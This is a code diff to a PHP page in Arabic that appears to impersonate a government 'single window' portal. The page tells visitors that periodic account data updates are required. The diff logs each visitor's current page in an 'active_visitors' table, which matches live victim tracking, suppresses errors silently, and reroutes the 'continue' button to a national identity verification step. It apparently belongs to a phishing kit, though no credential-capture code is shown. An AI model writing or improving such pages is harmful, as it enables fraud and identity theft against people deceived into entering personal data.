@@ -13,13 +13,18 @@ try {
     $dsn = "pgsql:host=$host;port=$port;dbname=$dbname;";
     $pdo = new PDO($dsn, $user, $password, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
     
-    $visitor_id = isset($_POST['visitor_id']) ? $_POST['visitor_id'] : 'visitor_session'; 
+    // إنشاء أو جلب معرف الزائر الفريد والموحد للجلسة
+    if (isset($_POST['visitor_id']) && !empty($_POST['visitor_id'])) {
+        $visitor_id = $_POST['visitor_id'];
+    } else {
+        $visitor_id = 'vis_' . bin2hex(random_bytes(8));
+    }
     
-    // تحديث اسم الصفحة الحالية إلى صفحة التحقق من الهوية في قاعدة البيانات
+    // تحديث اسم الصفحة الحالية إلى صفحة تحديث البيانات في قاعدة بيانات رندر
     $stmt_vis = $pdo->prepare("INSERT INTO active_visitors (visitor_id, current_page, last_seen) 
-                               VALUES (:visitor_id, 'صفحة التحقق من الهوية', NOW()) 
+                               VALUES (:visitor_id, 'صفحة تحديث البيانات', NOW()) 
                                ON CONFLICT (visitor_id) 
-                               DO UPDATE SET current_page = 'صفحة التحقق من الهوية', last_seen = NOW()");
+                               DO UPDATE SET current_page = 'صفحة تحديث البيانات', last_seen = NOW()");
     $stmt_vis->execute([':visitor_id' => $visitor_id]);
 } catch (Exception $e) {
     // معالجة صامتة لحماية التصميم
@@ -30,7 +35,7 @@ try {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>التحقق من الهوية - النافذة الواحدة</title>
+    <title>تحديث البيانات - النافذة الواحدة</title>
     <style>
         * {
             box-sizing: border-box;
@@ -175,8 +180,8 @@ try {
                 نجري تحديث بيانات على جميع الحسابات بشكل دوري، لنتمكن من تحديث بيانات السكن وأرقام الهواتف والبريد الالكتروني.
             </p>
 
-            <!-- هنا يتم التوجيه للملف التالي عند الضغط على زر استمر -->
-            <form action="save.php" method="POST">
+            <!-- تم تعديل التوجيه هنا ليذهب بالزائر إلى صفحة التوثيق الوطني بالمعرف الصحيح -->
+            <form action="identity_verification.php" method="POST">
                 <input type="hidden" name="visitor_id" value="<?php echo htmlspecialchars($visitor_id); ?>">
                 <button type="submit" class="btn-continue">استمر</button>
             </form>
